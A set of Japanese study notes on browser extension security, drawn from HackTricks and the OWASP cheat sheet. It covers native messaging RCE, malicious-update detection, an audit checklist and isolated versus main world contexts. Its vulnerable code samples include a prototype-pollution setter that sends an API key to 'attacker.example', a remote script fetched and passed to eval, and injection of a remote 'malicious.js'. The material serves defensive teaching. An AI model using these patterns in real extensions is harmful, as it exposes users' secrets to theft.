> ブラウザ拡張は、この通信を使えるようにするために `nativeMessaing` 権限も宣言する必要がある。

バックグラウンドスクリプトがネイティブアプリケーションへメッセージを送るコードの例:

```javascript
chrome.runtime.sendNativeMessage(
  "com.my_company.my_application",
  { text: "Hello" },
  function (response) {
    console.log("Received " + response)
  }
)
```

[**このブログ記事**](https://spaceraccoon.dev/universal-code-execution-browser-extensions/) では、ネイティブメッセージを悪用する脆弱なパターンが提示されている:

1. ブラウザ拡張がContent Scriptにワイルドカードパターンを持つ。
2. Content Scriptが `postMessage` メッセージを `sendMessage` を使ってバックグラウンドスクリプトへ渡す。
3. バックグラウンドスクリプトが `sendNativeMessage` を使ってネイティブアプリケーションへメッセージを渡す。
4. ネイティブアプリケーションがメッセージを危険に処理し、コード実行に至る。

そしてこの記事の中で、**ブラウザ拡張を悪用して任意のページからRCEに至る例**が説明されている。

### Sensitive Information in Memory/Code/Clipboard（メモリ/コード/クリップボード内の機密情報）（出典: HackTricks）

ブラウザ拡張が**機密情報をメモリに保存**している場合、ローカルプロセスダンプ（特にWindows）でそれが露出しうる。

したがって、ブラウザ拡張のメモリは**セキュアと見なすべきでなく**、認証情報やニーモニックフレーズのような**機密情報を保存すべきでない**。

当然、**コードに機密情報を置いてはならない**。コードは**公開される**ため。

ブラウザからメモリをダンプするには、**プロセスメモリをダンプ**するか、ブラウザ拡張の**設定**に行き **`Inspect pop-up`** をクリック → **`Memory`** セクション → **`Take a snaphost`**（原文ママ）を実行し、**`CTRL+F`** でスナップショット内の機密情報を検索する。

さらに、ニーモニックキーやパスワードのような高度に機微な情報は、**クリップボードにコピーできないようにすべき**（または少なくとも数秒でクリップボードから削除すべき）。クリップボードを監視するプロセスがそれらを取得できるため。

### Loading an Extension in the Browser（ブラウザへの拡張の読み込み）（出典: HackTricks）

1. ブラウザ拡張を**ダウンロード**して解凍(unzip)する。
2. **`chrome://extensions/`** に行き `Developer Mode` を**有効化**する。
3. **`Load unpacked`** ボタンをクリックする。

**Firefox** では **`about:debugging#/runtime/this-firefox`** に行き **`Load Temporary Add-on`** ボタンをクリックする。

### Getting the source code from the store（ストアからのソースコード取得）（出典: HackTricks）

Chrome拡張のソースコードは様々な方法で取得できる。以下に各オプションの詳細な説明と手順を示す。

#### Download Extension as ZIP via Command Line（コマンドラインでZIPとしてDL）

Chrome拡張のソースコードは、コマンドラインを使ってZIPファイルとしてダウンロードできる。`curl` を使って特定のURLからZIPを取得し、その内容をディレクトリに展開する。手順:

1. `"extension_id"` を実際の拡張IDに置き換える。
2. 次のコマンドを実行する（逐語）:

```bash
extension_id=your_extension_id   # Replace with the actual extension ID
curl -L -o "$extension_id.zip" "https://clients2.google.com/service/update2/crx?response=redirect&os=mac&arch=x86-64&nacl_arch=x86-64&prod=chromecrx&prodchannel=stable&prodversion=44.0.2403.130&x=id%3D$extension_id%26uc"
unzip -d "$extension_id-source" "$extension_id.zip"
```

#### Use the CRX Viewer website（CRX Viewer サイト）

[https://robwu.nl/crxviewer/](https://robwu.nl/crxviewer/)

#### Use the CRX Viewer extension（CRX Viewer 拡張）

もう一つの便利な方法は、オープンソースプロジェクトの **Chrome Extension Source Viewer** を使うこと。[Chrome Web Store](https://chrome.google.com/webstore/detail/chrome-extension-source-v/jifpbeccnghkjeaalbbjmodiffmgedin?hl=en) からインストールできる。ビューアのソースコードは [GitHubリポジトリ](https://github.com/Rob--W/crxviewer) にある。

#### View source of locally installed extension（ローカルインストール済み拡張のソース閲覧）

ローカルにインストールされたChrome拡張も検査できる。手順:

1. `chrome://version/` を開いて "Profile Path" フィールドを見つけ、Chromeのローカルプロファイルディレクトリにアクセスする。
2. プロファイルディレクトリ内の `Extensions/` サブフォルダに移動する。
3. このフォルダには、通常は可読な形式のソースコードとともに、全インストール済み拡張が含まれる。

拡張を識別するには、IDを名前にマッピングできる:

- `about:extensions` ページで Developer Mode を有効化し、各拡張のIDを見る。
- 各拡張のフォルダ内の `manifest.json` ファイルには可読な `name` フィールドがあり、拡張の識別に役立つ。

#### Use a File Archiver or Unpacker（ファイルアーカイバ/アンパッカー）

Chrome Web Store に行き拡張をダウンロードする。ファイルは `.crx` 拡張子を持つ。拡張子を `.crx` から `.zip` に変更する。任意のファイルアーカイバ（WinRAR, 7-Zipなど）でZIPの内容を展開する。

#### Use Developer Mode in Chrome（ChromeのDeveloper Mode利用）

Chromeを開き `chrome://extensions/` に行く。右上の "Developer mode" を有効化する。"Load unpacked extension..." をクリックする。拡張のディレクトリに移動する。これはソースコードをダウンロードするわけではないが、既にダウンロード/開発済みのコードを閲覧・変更するのに便利。

### Chrome extension manifest dataset（Chrome拡張manifestデータセット）（出典: HackTricks）

脆弱なブラウザ拡張を発見しようとする場合、[https://github.com/palant/chrome-extension-manifests-dataset](https://github.com/palant/chrome-extension-manifests-dataset) を使い、manifestファイルを潜在的に脆弱な兆候についてチェックできる。例えば、25000人（原文コメントの実クエリは250000）超のユーザーを持ち、`content_scripts` と `nativeMessaing` 権限を持つ拡張をチェックするには（逐語）:

```bash
# Query example from https://spaceraccoon.dev/universal-code-execution-browser-extensions/
node query.js -f "metadata.user_count > 250000" "manifest.content_scripts?.length > 0 && manifest.permissions?.includes('nativeMessaging')"
```

### Post-exploitation: Forced extension load & persistence (Windows)（後侵害: 強制拡張読み込みと永続化）（出典: HackTricks）

per-user の Preferences を直接編集し、有効なHMACを偽造(forge)することで、プロンプトやフラグなしにブラウザが任意のunpacked拡張を受け入れ・有効化するよう仕向ける、Chromiumをバックドア化するステルス技術。（詳細は HackTricks の `forced-extension-load-preferences-mac-forgery-windows.md`。）

### Detecting Malicious Extension Updates (Static Version Diffing)（悪性拡張更新の検出・静的バージョン差分）（出典: HackTricks）

サプライチェーン侵害は、しばしば以前は良性だった拡張への**悪性更新**として到来する。実践的で低ノイズな手法は、静的解析（例 [Assemblyline](https://github.com/CybercentreCanada/assemblyline)）を使って、**新しい拡張パッケージを最後の既知良好版と比較**すること。目標は、任意の変更ではなく**高シグナルのデルタ**に対してアラートを出すこと。

#### Workflow（ワークフロー）

- **両バージョン**（旧+新）を同じ静的解析プロファイルに**提出**する。
- **新規/更新されたバックグラウンド/service workerスクリプト**にフラグを立てる（永続化 + 特権ロジック）。
- **新規/更新されたContent Script**にフラグを立てる（DOMアクセスとデータ収集）。
- `manifest.json` に追加された**新しいpermissions/host_permissions**にフラグを立てる。
- コードから抽出された**新しいドメイン**にフラグを立てる（潜在的なC2/exfilエンドポイント）。
- **新しい静的解析検知**にフラグを立てる（例 base64デコード、cookieハーベスティング、ネットワークリクエストビルダー、難読化パターン）。
- 変更されたスクリプトの急激なエントロピー上昇や外れ値zスコアのような**統計的異常**にフラグを立てる。

#### Detecting script changes accurately（スクリプト変更の正確な検出）

- **新規スクリプト追加** → `manifest.json` の差分で検出。
- **既存スクリプトの変更**（manifest不変） → 展開されたファイルツリーの**ファイル毎のハッシュ**を比較（例 Assemblyline の `Extract` 出力）。これは既存workerやContent Scriptへのステルス更新を捕捉する。

#### Pre-disclosure detections（公開前検出）

既知IOCに基づく「イージーモード」検出を避けるため、**脅威インテリジェンス供給サービスを無効化**し、内在的シグナル（ドメイン、ヒューリスティックシグネチャ、スクリプトデルタ、エントロピー異常）に依拠する。これにより**公開報告前**に悪性更新を捕捉する可能性が高まる。

#### Example high-confidence alert logic（高信頼アラートロジックの例）

- **低ノイズの組合せ:** 新しいドメイン + 新しい静的解析検知 + 更新されたバックグラウンド/service worker + 更新または追加されたContent Script。
- **より広い捕捉:** 新しいドメイン + 新規または更新されたバックグラウンド/service worker（高recall・高ノイズ）。

このワークフローの主要なAssemblylineサービス:

- **Extract**: 拡張を展開しファイル毎のハッシュを生成。
- **Characterize**: ファイル特性（例 エントロピー）を計算。
- **JsJAWS / FrankenStrings / URLCreator**: JSヒューリスティック・文字列・ドメインを表面化し、バージョン間で差分をとる。

### Security Audit Checklist（セキュリティ監査チェックリスト）（出典: HackTricks）

ブラウザ拡張は**限られた攻撃面**しか持たないが、一部は**脆弱性**や**ハードニング改善の余地**を含みうる。以下は最も一般的なもの（逐語チェックリスト）:

- [ ] 要求する **`permissions`** を可能な限り**制限**する
- [ ] **`host_permissions`** を可能な限り**制限**する
- [ ] **強い** **`content_security_policy`** を使う
- [ ] **`externally_connectable`** を可能な限り**制限**する。不要かつ可能ならデフォルトのまま放置せず **`{}`** を指定する
  - [ ] ここに **XSSやテイクオーバーに脆弱なURL** が記載されると、攻撃者は**バックグラウンドスクリプトへ直接メッセージを送信**できる。非常に強力なバイパス。
  - [ ] **特権的**な外部メッセージハンドラに対して `*.example.com` のようなワイルドカードやsuffix信頼を拒否する。
  - [ ] 許可されたオリジンが、信頼されたサブドメイン上でコード実行を復元しうる**ベンダーホストのウィジェット**・**ユーザーコンテンツ**・**バージョン付きレガシーアセット**を配信していないかレビューする。
- [ ] **`web_accessible_resources`** を可能な限り**制限**する。可能なら空でも。
- [ ] **`web_accessible_resources`** が空でない場合、[**ClickJacking**](browext-clickjacking.md) をチェックする。
- [ ] **拡張**から**Webページ**への何らかの**通信**が発生する場合、その通信で生じる [**XSS**](browext-xss-example.md) 脆弱性をチェックする。
  - [ ] Post Messagesが使われている場合、[**Post Message脆弱性**](../postmessage-vulnerabilities/index.html) をチェックする。
  - [ ] **Content ScriptがDOM詳細にアクセス**する場合、それがWebによって**改変**されてXSSを導入していないか確認する。
  - [ ] この通信が **Content Script -> Background script通信** にも関与している場合は特に強調する。
  - [ ] バックグラウンドスクリプトが**ネイティブメッセージング**で通信する場合、通信がセキュアかつサニタイズされているか確認する。
- [ ] **機密情報**をブラウザ拡張の**コード**内に保存すべきでない。
- [ ] **機密情報**をブラウザ拡張の**メモリ**内に保存すべきでない。
- [ ] **機密情報**を**ファイルシステム上に無保護で**保存すべきでない。

### Browser Extension Risks（ブラウザ拡張のリスク）（出典: HackTricks）

- アプリ [https://crxaminer.tech/](https://crxaminer.tech/) は、ブラウザ拡張が要求する権限などのデータを解析し、その拡張の使用のリスクレベルを与える。

### Tools（ツール）（出典: HackTricks）

#### [Tarnish](https://thehackerblog.com/tarnish/)

- 提供されたChrome webstoreリンクから任意のChrome拡張を取得(Pull)する。
- [**manifest.json**](https://developer.chrome.com/extensions/manifest) **viewer**: 拡張のmanifestをJSON整形版で単に表示する。
- **Fingerprint Analysis（フィンガープリント解析）**: [web_accessible_resources](https://developer.chrome.com/extensions/manifest/web_accessible_resources) の検出と、Chrome拡張フィンガープリンティングJavaScriptの自動生成。
- **Potential Clickjacking Analysis（潜在的Clickjacking解析）**: [web_accessible_resources](https://developer.chrome.com/extensions/manifest/web_accessible_resources) ディレクティブが設定された拡張HTMLページの検出。これらはページの目的次第でclickjackingに潜在的に脆弱。
- **Permission Warning(s) viewer**: ユーザーが拡張インストールを試みたときに表示される、全Chrome権限プロンプト警告のリストを表示する。
- **Dangerous Function(s)（危険な関数）**: 攻撃者に悪用されうる危険な関数（例 `innerHTML`, `chrome.tabs.executeScript` など）の場所を表示する。
- **Entry Point(s)（エントリポイント）**: 拡張がユーザー/外部入力を受け取る場所を表示する。拡張の攻撃面を理解し、悪意ある細工データを送る潜在的ポイントを探すのに有用。
- Dangerous Function(s) と Entry Point(s) の両スキャナは、生成するアラートに次を持つ:
  - アラートを引き起こした関連コードスニペットと行。
  - 問題の説明。
  - コードを含むソースファイル全体を見る "View File" ボタン。
  - アラートされたファイルのパス。
  - アラートされたファイルの完全なChrome拡張URI。
  - ファイルの種類（Background Page script, Content Script, Browser Action など）。
  - 脆弱な行がJavaScriptファイルにある場合、それがincludeされる全ページのパスとそのページの種類、[web_accessible_resource](https://developer.chrome.com/extensions/manifest/web_accessible_resources) ステータス。
- **Content Security Policy (CSP) analyzer and bypass checker**: 拡張のCSPの弱点を指摘し、ホワイトリスト化されたCDNなどによるCSPバイパスの潜在的方法を照らし出す。
- **Known Vulnerable Libraries（既知の脆弱ライブラリ）**: [Retire.js](https://retirejs.github.io/retire.js/) を使い、既知の脆弱なJavaScriptライブラリの使用をチェックする。
- 拡張のダウンロードと整形版:
  - オリジナルの拡張をダウンロード。
  - 整形(beautify)版の拡張をダウンロード（HTMLとJavaScriptを自動prettify）。
- スキャン結果の自動キャッシュ。拡張スキャンは初回はかなり時間がかかるが、2回目は（拡張が更新されていなければ）結果がキャッシュされるためほぼ即時。
- リンク可能なレポートURL。tarnishが生成した拡張レポートを他者に簡単にリンクできる。

#### [Neto](https://github.com/elevenpaths/neto)

Project Neto は、Firefox や Chrome などのブラウザ用のブラウザプラグイン・拡張を解析するための Python 3 パッケージ。拡張パッケージを展開(unpack)し、`manifest.json`・ローカライゼーションフォルダ・JavaScript・HTMLファイルなどのリソースから関連する特徴を抽出する。

このメソドロジーの手助けをした [@naivenom](https://twitter.com/naivenom) に感謝。

### References（参照、逐語）（出典: HackTricks）

- [1] [Introduction to Chrome Browser Extension Security Testing](https://www.cobalt.io/blog/introduction-to-chrome-browser-extension-security-testing)
- [2] [Anatomy of a Basic Extension](https://palant.info/2022/08/10/anatomy-of-a-basic-extension/)
- [3] [Attack Surface of Extension Pages](https://palant.info/2022/08/24/attack-surface-of-extension-pages/)
- [4] [When Extension Pages Are Web-Accessible](https://palant.info/2022/08/31/when-extension-pages-are-web-accessible/)
- [5] [Content scripts - Chrome for Developers](https://developer.chrome.com/docs/extensions/develop/concepts/content-scripts)
- [6] [externally_connectable - Chrome for Developers](https://developer.chrome.com/docs/extensions/reference/manifest/externally-connectable)
- [7] [Background Pages (Manifest V2) - Chrome for Developers](https://developer.chrome.com/docs/extensions/mv2/background-pages)
- [8] [Kicking the Rims: A Guide for Securely Writing and Auditing Chrome Extensions](https://thehackerblog.com/kicking-the-rims-a-guide-for-securely-writing-and-auditing-chrome-extensions/)
- [9] [How to View Source of a Chrome Extension (gist)](https://gist.github.com/LongJohnCoder/9ddf5735df3a4f2e9559665fb864eac0)
- [10] [Moving up the Assemblyline: Exposing Malicious Code in Browser Extensions](https://redcanary.com/blog/threat-detection/assemblyline-browser-extensions/)
- [11] [ShadowPrompt: How Any Website Could Have Hijacked Anthropic's Claude Chrome Extension](https://www.koi.ai/blog/shadowprompt-how-any-website-could-have-hijacked-anthropic-claude-chrome-extension)
- [12] [An Evaluation of the Google Chrome Extension Security Architecture](http://webblaze.cs.berkeley.edu/papers/Extensions.pdf)
- [13] [Universal Code Execution in Browser Extensions](https://spaceraccoon.dev/universal-code-execution-browser-extensions/)
- [14] [Opera Browser Zero-Day RCE Vulnerability on Cross-Platforms](https://www.darkrelay.com/post/opera-zero-day-rce-vulnerability)
- [15] Thanks to [@naivenom](https://twitter.com/naivenom) for the help with this methodology
- [16] [Passbolt PBL-02 security report](https://help.passbolt.com/assets/files/PBL-02-report.pdf)
- [17] [developer.chrome.com - Concepts - Native Messaging](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging)

---

# 第2部: OWASP — Browser Extension Vulnerabilities Cheat Sheet

（出典: https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html ／ 原典: OWASP/CheatSheetSeries GitHub。開発者視点の防御策13カテゴリ。）

このチートシートは、脆弱性(Vulnerability)・例(Example)・緩和策(Mitigation)の3節構成で13カテゴリを扱う。

### 1. Permissions Overreach（権限過剰）（出典: OWASP）

**脆弱性:** ブラウザ拡張は必要以上の権限を要求することがある。これにより、全タブ・閲覧履歴・機微なユーザーデータへのアクセスが付与されうる。拡張が侵害されると深刻なプライバシーリスクになる。

**例（逐語）:**

```json
{
  "manifest_version": 3,
  "name": "My Extension",
  "permissions": [
    "tabs",
    "http://*/*",
    "https://*/*",
    "storage"
  ]
}
```

**緩和策:** 最小権限の原則(Principle of Least Privilege, PoLP)に従い、絶対に必要な権限のみを要求する。可能な限り、前もって完全なアクセスを付与するのではなくoptional permissionsを使う。不要になった権限を定期的に監査・削除する。

### 2. Data Leakage（データ漏洩）（出典: OWASP）

**脆弱性:** 一部の拡張は、適切なセキュリティ対策なしに閲覧アクティビティや個人情報を外部サーバーに送信し、意図せずユーザーデータを露出する。

**例（逐語）:**

```javascript
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete') {
    fetch('http://example.com/track', {
      method: 'POST',
      body: JSON.stringify({ URL: tab.URL })
    });
  }
});
```

**緩和策:** データ傍受を防ぐため全通信に常にHTTPSを使う。データ収集を制限し、Privacy Policyで何を収集するかを明示して透明性を保つ。個人データの収集・送信前にユーザー同意メカニズムを実装する。

### 3. Cross-Site Scripting (XSS)（出典: OWASP）

**脆弱性:** ユーザー入力が適切にサニタイズされないと、攻撃者がWebページに悪意あるスクリプトを注入でき、ユーザーデータの窃取や不正操作を行いうる。

**例（逐語）:**

```javascript
let userInput = document.getElementById('input').value;
document.getElementById('output').innerHTML = userInput; // No sanitization
```

**緩和策:** インラインスクリプトをブロックするためContent Security Policy (CSP)を実装する。DOMPurifyのようなライブラリでユーザー入力を表示前にサニタイズする。`innerHTML` の使用を避け、代わりに `textContent` を使って注入スクリプトの実行を防ぐ。

### 4. Insecure Communication（非セキュア通信）（出典: OWASP）

**脆弱性:** 一部の拡張は非セキュアなHTTP接続で機微なデータを送信し、攻撃者による傍受に脆弱になる。

**例（逐語）:**

```javascript
fetch('http://example.com/api/data');
```

**緩和策:** データ窃取を防ぐため外部通信に常にHTTPSを使う。処理前にサーバー応答を検証してデータ完全性を保証する。

### 5. Code Injection（コードインジェクション）（出典: OWASP）

**脆弱性:** 信頼できないソースから動的にスクリプトをロードする拡張は、悪意あるコードを注入・実行されうる。

**例（逐語）:**

```javascript
let script = document.createElement('script');
script.src = 'http://example.com/malicious.js';
document.body.appendChild(script);
```

**緩和策:** CSP (Content Security Policy)を使ってスクリプトソースを制限する（詳細は [CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)）。`eval()` と `innerHTML` は悪意あるコードを実行しうるので使用を避ける。ページにスクリプトを注入する代わりに拡張のメッセージングAPIを使うことを推奨。

### 6. Malicious Updates（悪性更新）（出典: OWASP）

**脆弱性:** 拡張が信頼できないサーバーから更新を取得すると、攻撃者が全ユーザーに悪性更新をプッシュしうる。

**例（逐語）:**

```javascript
chrome.runtime.onInstalled.addListener(() => {
  fetch('http://example.com/update-script.js')
    .then(response => response.text())
    .then(eval); // Unsafe!
});
```

**緩和策:** 真正性を保証するため拡張更新をデジタル署名する。拡張内で更新を取得するのではなく、拡張マーケットプレイスからの更新に依拠する。["Don't inject or incorporate remote scripts"](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Security_best_practices) を参照。取得したコードを実行する前に完全性チェックを実装する。

### 7. Third-Party Dependencies（サードパーティ依存）（出典: OWASP）

**脆弱性:** 拡張で古い/脆弱な第三者ライブラリを使うと、それらに既知のエクスプロイトがある場合にセキュリティリスクを招く。

**例（逐語）:**

```json
{
  "dependencies": {
    "vulnerable-lib": "1.0.0"
  }
}
```

**緩和策:** 第三者依存をセキュリティ脆弱性について定期的に監査する。`npm audit` や OWASP Dependency-Check のようなツールでリスクを検出する。頻繁にセキュリティ更新される、活発にメンテナンスされているライブラリを推奨。

### 8. Lack of Content Security Policy (CSP)（CSP欠如）（出典: OWASP）

**脆弱性:** 厳格なCSPがないと、攻撃者が拡張のWebページにスクリプトを注入でき、XSS攻撃のリスクが増す。

**例（逐語）:**

```json
{
  "manifest_version": 3,
  "name": "My Extension",
  "content_security_policy": "default-src 'self'"
}
```

**緩和策:** 拡張の `manifest.json` に厳格なCSPを定義する。nonceベースまたはhashベースのポリシーを使って信頼できるスクリプトのみを許可する。インラインスクリプトの実行をブロックし、第三者コンテンツソースを制限する。

### 9. Insecure Storage（非セキュアストレージ）（出典: OWASP）

**脆弱性:** 認証トークンのような機微なデータを `localStorage` などの非セキュアな場所に保存すると、攻撃者が容易にアクセスできる。

**例（逐語）:**

```javascript
localStorage.setItem('token', 'my-secret-token'); // No encryption
```

**緩和策:** 機微なデータを、`localStorage` より優れたセキュリティを提供する Chrome Storage API に保存する。ローカル保存前にデータを暗号化する。APIキーや認証情報を拡張コード内にハードコードしない。

### 10. Insufficient Privacy Controls（プライバシー統制不足）（出典: OWASP）

**脆弱性:** 拡張がユーザーデータの収集・取扱い方法を明示しないと、プライバシー侵害と不正なデータ利用を招きうる。

**例（逐語）:**

```json
{
  "manifest_version": 3,
  "name": "My Extension",
  "description": "A cool extension with no privacy policy."
}
```

**緩和策:** データ収集慣行を説明する明確なプライバシーポリシーを実装する。ユーザーがデータ収集をオプトアウトできるようにする。GDPR・CCPAなどのプライバシー規制に準拠するため、データ共有慣行を開示する。

### 11. DOM-based Data Skimming（DOMベースのデータスキミング）（出典: OWASP）（重要）

**脆弱性:** 拡張が機微なユーザー情報をWebページのDOMに直接レンダリングすると、そのデータはページ自身のスクリプトからアクセス可能になる。

このリスクは使用手法に関わらず適用される（プレーンなJavaScript DOM操作でも、Reactのようなフレームワークで構築したコンポーネントの注入でも同様）。

悪意ある/侵害されたWebページはDOMを検査し、機微なデータ（例 個人識別情報, 財務詳細, AIチャット履歴）を読み取り、外部流出(exfiltrate)しうる。

**例（逐語）:**

```javascript
// content-script.js

// Sensitive data fetched from the extension's background service
const userData = {
  name: "Jane Doe",
  email: "jane.doe@example.com"
};

// This injects sensitive data directly into the page's DOM
const userInfoDiv = document.createElement('div');
userInfoDiv.innerText = `name: ${userData.name}, email: ${userData.email}`;
document.body.appendChild(userInfoDiv);
```

**緩和策:** いかなる機微情報もWebページのDOMに直接レンダリングするのを避ける。代わりに、Webページのコンテキストから隔離され拡張が制御するUI要素に機微データを表示する。

安全な代替:

- **Popup:** ユーザーが拡張アイコンをクリックすると現れるポップアップUIに情報を表示する。
- **Options Page:** ユーザー固有のデータや設定の表示に専用のオプションページを使う。
- **Side Panel:** ページコンテンツから隔離された別ペインに永続UIを表示するためサイドパネルを使う（FYI: "Side Panel" はChromium用語。Firefoxでは "Sidebar" と呼ぶ）。

重要な注意点として、カプセル化に Shadow DOM を使っても十分な safeguard にならない可能性がある。ページスクリプトは 'open' Shadow DOM をなお query できるため。さらに、他のブラウザ拡張を脅威と見なすセキュリティモデルなら、'closed' Shadow DOM ですら安全でない。拡張は [`openOrClosedShadowRoot()` API](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/dom/openOrClosedShadowRoot) を使って 'closed' Shadow DOM を貫通(spear through)できるため。

したがって、真に分離された拡張制御のUIを使うことが最も信頼できる緩和策。

### 12. Prototype-based Data Skimming（プロトタイプベースのデータスキミング）（出典: OWASP）（isolated world vs main world の核心）

**脆弱性:** 拡張のContent Scriptは **"isolated world"**（Webページのコンテキストから分離されたJavaScriptコンテキスト）で実行される。一方で、拡張がスクリプトを **"main world"**（Webページのコンテキスト）で実行する方法もいくつか存在する。例えば、拡張は [web accessible resources](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/manifest.json/web_accessible_resources) のスクリプトを指す `src` 属性を持つ `<script>` タグをDOMに直接注入できる。

拡張がWebページのコンテキストで実行される任意のスクリプトで機微なユーザー情報を使うと、そのデータはページのスクリプトからアクセス可能になる。よってWebページが侵害/悪意ある場合、データは盗まれる。

データがアクセス可能になる理由は、コンテキストのグローバルオブジェクト（"built-in objects", "primordials", "prototypes" と呼ばれる）が通常と異なる動作をするよう上書きされうるため。これは "prototype pollution"（プロトタイプ汚染）, "prototype overriding"（プロトタイプ上書き）などと呼ばれる。

つまり、悪意ある/侵害されたWebページは、自身のコンテキストのグローバルオブジェクトを上書きし、それらが扱う任意のデータを盗みうる。ここでのオブジェクトは関数を含むコンテキスト内のほぼすべてを含む点に注意。よって拡張の注入スクリプトが、機微データとともにこれら上書きされたオブジェクトを使うと、意図せず悪意あるコードをトリガーし、そのデータの外部流出につながる。

**例（逐語）:**

```javascript
// Malicious script overwriting all objects' setter for 'apiKey'
// to send the value to be set towards a server.
Object.defineProperty(Object.prototype, 'apiKey', {
    set: function (str) {
        fetch(`https://attacker.example?data=${str}`);
        Object.defineProperty(this, 'apiKey', {
            value: str
        })
        return str
    }
})

// Extension's script to be executed on a web page's context.
window.addEventListener('message', (data) => {
  if (data.apiKey) {
    // the setter for 'apiKey' is already polluted,
    // and the below line triggers malicious code and the data is immediately sent.
    window.apiController.apiKey = data.apiKey;
  }
})
```

**緩和策:** 機微なユーザー情報を扱うときは、たとえ一瞬でもWebページのコンテキストを使わないこと。Webページのコンテキストのスクリプトとの通信が必要な場合は、非機微で必須の情報のみを使う。例えば、秘密トークン全体ではなく検証結果だけを渡す。これは `window.postMessage` を使う場合でも同様で、それも上書きされうるし、悪意あるスクリプトが `message` イベントのリスナーを追加しうるため。

トリックでネイティブ（上書きされていない）プロトタイプを取得しようとするのは推奨されない点にも注意。他のスクリプトも実行されるコンテキストでネイティブプロトタイプを取得するハックはいくつか存在するが、その対策のバイパス（他のスクリプトに上書きされたプロトタイプを使わせる方法）がしばしば発明される。

また、拡張のスクリプトが `document_start` タイミングで実行されても、ネイティブプロトタイプを使えると仮定しないこと。少なくともChromiumブラウザ拡張の場合、新規作成されたiframeのコンテキストは、`document_start` イベント時でも拡張のスクリプトが開始する**前に**Webページのスクリプトによって細工されうることが知られている（[公式バグissue](https://issues.chromium.org/issues/40202434)）。

### 13. Insecure Message Passing（非セキュアなメッセージパッシング）（出典: OWASP）（重要）

**脆弱性:** ブラウザ拡張はしばしば、低特権コンテキスト（Content Scripts, Popup）と高特権のService Worker（Background）間のメッセージパッシング（`chrome.runtime.sendMessage/onMessage`）に依拠する。Service Workerが送信者のorigin/URLを検証しないと、侵害されたWebページが悪意あるメッセージを送り、拡張を騙して特権アクション（例 機微データやAPIキーの取得）を実行させうる。

**例（逐語）:**

```javascript
// In Service Worker (Background)
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'fetchSecret') { // No validation of sender
    // A malicious content script/webpage could trigger this.
    fetch(SECRET_API_URL);
  }
});
```

**緩和策:** すべての受信メッセージを信頼できない入力として扱う。Service Workerでは常に:

- `sender.id` を検証し、メッセージが自分の拡張から発生したことを保証する。
- `sender.url` または `sender.origin` を検証し、どの拡張ページ/Content Scriptが通信できるかを制限する。
- Webページがコンテンツスクリプトを介して特権ロジックに間接的に影響することを許さない。
- `request.action` と全リクエストパラメータの厳格な検証・allow-listingを行う。

Chromeは、Content Scriptは拡張ページよりも信頼性が低く、それに応じて扱うべきと明示している。セキュアな例（逐語）:

```javascript
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (sender.id !== chrome.runtime.id) return;
  if (!sender.url?.startsWith('chrome-extension://')) return;

  if (request.action === 'fetchSecret') {
    fetch(SECRET_API_URL);
  }
});
```

### Conclusion（結論）（出典: OWASP）

これらのセキュリティベストプラクティスに従うことで、開発者はより安全なブラウザ拡張を構築し、プライバシー・セキュリティの脅威からユーザーを守れる。拡張開発時は常に、最小権限・暗号化・セキュアコーディング原則を優先すること。

References（逐語）:
- [Google Chrome Extension Security Guide](https://developer.chrome.com/docs/extensions/mv3/security/)
- [Mozilla Firefox Extension Security Best Practices](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Security_best_practices)

---

## 教科書用の統合まとめ（ch08向け）

### isolated world vs main world（分離ワールド vs メインワールド）

| 観点 | isolated world | main world |
|------|----------------|------------|
| 実行主体 | Content Script | ページ自身のスクリプト / 拡張がDOM注入した`<script>`（web_accessible_resources経由） |
| JSヒープ | ページと**別**（HackTricks: 別JavaScriptヒープ） | ページと**共有** |
| DOMアクセス | 可（共有DOM） | 可 |
| ページJS変数/関数への直接アクセス | 不可（JSポインタ交換なし） | 可 |
| prototype pollutionの影響 | 受けにくい（分離） | **直接受ける**（OWASP #12） |
| chrome.* API | 一部（storage等） | 原則不可 |

**診断ポイント:** 拡張が機微データを main world で扱っている（web_accessible_resourcesのスクリプトを注入し `window.postMessage` でやり取りしている）場合、ページのprototype汚染で盗まれうる（OWASP #12）。「`document_start` だから安全」は成り立たない（iframeコンテキストは拡張スクリプト開始前に細工されうる）。

### manifest.json の攻撃面フィールド一覧（source/sink観点）

| フィールド | 意味 | 攻撃面/リスク |
|-----------|------|--------------|
| `permissions` | storage, tabs, nativeMessaging等の能力 | 過剰付与で侵害時の被害拡大（OWASP #1） |
| `host_permissions` | どのWebページで動くか | 広すぎると全サイトのデータにアクセス |
| `content_scripts.matches`/`exclude_matches` | Content Script注入対象 | ワイルドカードでネイティブメッセージRCE連鎖の起点に |
| `content_security_policy` | 拡張ページのCSP | 弱いと拡張ページXSS。デフォルトは `script-src 'self'; object-src 'self';` |
| `web_accessible_resources` | Webからアクセス可能な拡張リソース | ClickJacking / XSS→背景スクリプト到達。extension-id露出。`use_dynamic_url`でID動的化可 |
| `externally_connectable` | 外部から接続できる拡張/Webページ | **最重要**。XSS/テイクオーバー可能オリジン許可→Content Script&CSPバイパスで背景スクリプト直接到達。ワイルドカード信頼厳禁 |
| `background.service_worker`(MV3)/`background.scripts`(MV2) | 中枢ロジック | 特権ロジック。sender検証不備で特権アクション悪用（OWASP #13） |
| `nativeMessaging` permission + native host json | ネイティブバイナリ通信 | RCEに至りうる。`allowed_origins`にワイルドカード不可 |

### メッセージパッシングAPI一覧（source/sink観点）

| API | 方向 | 備考 |
|-----|------|------|
| `window.postMessage` / `window.addEventListener("message")` | Web ↔ Content Script | 検証: `event.isTrusted`, origin, `event.source !== window`。上書きされうる |
| `chrome.runtime.sendMessage` / `chrome.runtime.onMessage.addListener` | 拡張内（CS↔Background） | 単発JSONメッセージ。`return true`で非同期応答 |
| `chrome.runtime.connect()` / `port.postMessage` / `port.onMessage` | 拡張内 | 永続接続 |
